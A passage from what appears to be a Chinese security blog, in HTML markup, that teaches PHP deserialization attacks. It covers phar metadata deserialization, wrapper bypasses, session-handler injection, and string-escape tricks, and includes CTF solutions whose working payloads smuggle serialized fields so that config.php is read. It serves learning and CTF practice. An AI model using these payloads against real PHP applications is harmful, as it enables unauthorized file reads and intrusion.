class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="phar反序列化–PHP-lt-8"><a href="#phar反序列化–PHP-lt-8" class="headerlink" title="phar反序列化–PHP&lt;8"></a>phar反序列化–PHP&lt;8</h1><h2 id="phar是什么"><a href="#phar是什么" class="headerlink" title="phar是什么"></a>phar是什么</h2><ol><li><p>功能：压缩文件，将内容序列化存储</p></li><li><p>如何生成：</p><blockquote><p>注意：要将php.ini中的phar.readonly选项设置为Off,并删除前面的;否则无法生成phar文件。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文件格式</p><p>用010打开生成的test.phar，观察phar文件的四个组成部分</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>​    关注stub和manifest</p><p>​stub：phar识别标志，只要有了这个识别标志，<strong>即使后缀名不为phar，php仍能够将文件识别为phar文件</strong></p><p>​manifest：这一部分是我们可控的地方，是反序列化漏洞的关键点</p><p>​    signature：当我们需要改变phar文件内容时，需要重新生成签名</p><p>​     </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ol><li><p>phar中manifest是用户自定义的</p></li><li><p>php一大部分的<strong>文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.phar是上面生成代码生成的</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.受到影响的函数</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>​</p></li></ol><p></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol><li><p>绕过phar开头</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>绕过phar标识符<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #使用压缩后phar文件同样也能反序列化</span><br></pre></td></tr></table></figure></li><li><p>签名修改</p></li></ol><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="session工作流程"><a href="#session工作流程" class="headerlink" title="session工作流程"></a>session工作流程</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="session序列化"><a href="#session序列化" class="headerlink" title="session序列化"></a>session序列化</h2><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的。</p><blockquote><p>通常文件名为sess_sessionid的形式，默认的引擎是php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h2><p>session序列化和反序列化所使用到的引擎不同</p><p>例如</p><ul><li><p>第一次请求，序列化用的引擎为php</p><p>假设要保存到session的数据为username&#x3D;khaz</p><ul><li><p>php怎么知道要保存哪些数据到session中</p><blockquote><p>通过在$_SESSION环境变量注册</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将username变量保存到session中</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>会话结束后，将$_SESSION序列化保存到session文件中。</p><p>正常保存</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果我们构造username&#x3D;|a:1:{s:8:”passwd”;s:4:”Khaz”;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>第二次请求，反序列化用的引擎为php_serialize</p><p>正常</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>从而我们就可以自定义$_SESSION环境变量的值</p></blockquote></li></ul><h1 id="过滤不当导致的字符串逃逸反序列"><a href="#过滤不当导致的字符串逃逸反序列" class="headerlink" title="过滤不当导致的字符串逃逸反序列"></a>过滤不当导致的字符串逃逸反序列</h1><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>php反序列化特点</p><ul><li>以}作为结束符，在}之后的字符会被舍去</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>反序列化时会根据前面给定的长度，读取对应长度的字符串</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; 括号只是标注处字符串</span></span><br><span class="line"><span class="comment">//长度为4从第一个&quot;开始读取4个字符a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当序列化的长度&#x2F;数量与实际不符时，反序列化会报错</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; 长度为4，实际字符串为a，长度为1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3说明有三个值，实际上a=&gt;1,b=&gt;2,只有两个值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>当存在以下流程：序列化→过滤→反序列化</p><ul><li><p>过滤：在对可控变量进行过滤了之后，就会使得其序列化的长度与字符串长度不匹配，然后反序列化的时候就会报错，无法执行反序列化，就不会执行攻击者构造的攻击代码。但是利用前面提到的第一和第二个特性，攻击者可以分析过滤前后字符串长度的变化，构造字符串(字符串形式为被过滤字符+目标子串)来覆盖其他变量。</p></li><li><p>目标字串：</p><p><code>&quot;;+序列化后的变量+&#125;</code></p><p>例如我想要逃逸<code>$name=&#39;khaz&#39;</code>，那么目标字串为<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="分类和思路"><a href="#分类和思路" class="headerlink" title="分类和思路"></a>分类和思路</h2><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路：让过滤后的字符串填充完长度，从而让后面的变量解放出来</span><br><span class="line">需要计算目标字串的长度l1和过滤后增加的长度l2</span><br><span class="line">payload:被过滤字符*(l1/l2)+目标子串</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">假设对变量<span class="variable">$a</span>进行过滤</span><br><span class="line">过滤规则：a→bb</span><br><span class="line"><span class="variable">$a</span>中的每个a在过滤后都会使字符串长度加<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">假设目标子串为：<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; 一共31个字符</span></span><br><span class="line"><span class="string">就需要重复a31次，构造<span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">这样序列化后有：</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">此时长度对应字符：62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤后：</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">长度对应字符： 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">从而使s:8:&quot;password&quot;;s:6:&quot;123456&quot;;解放出来</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zip得到源码,审计得到如下关键点/">www.zip得到源码，审计得到如下关键点</a></p><ol><li><p>flag在config.php</p></li><li><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用_代替\和\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#用hacker代替array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>字符串逃逸：字符串变多 where：5  →  hacker：6  </p></li><li><p>反序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>字符串逃逸覆盖$photo为config.php</p></li><li><p>序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11位数字</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxx限制[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#长度&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>需要绕过nickname的正则，用数组绕过即可。</p></li></ol><p>需要逃逸的变量为<code>$photo=&#39;config.php&#39;</code>，目标子串为<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，共33个字符，一个where在替换后长度加1，所以需要33个where。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化后：&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">过滤后:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span class="line">反序列化后：E:\浏览器下载\chrome\新建文件夹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还要注意的点就是因为要绕过正则，所以nickname→nickname[]，数组序列化后就需要闭合{，所以</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34个where，并且需要手动添加一个}来闭合多出的{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：过滤后字符减少，会吃掉后面的字符，所以需要计算过滤处到目标子串的长度</span><br><span class="line">见下面例子，因为这种情况需要观察序列化字符串才能得到过滤处到目标子串的长度，而不是像过滤后字符变多那样可以直接构造。</span><br></pre></td></tr></table></figure><h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span 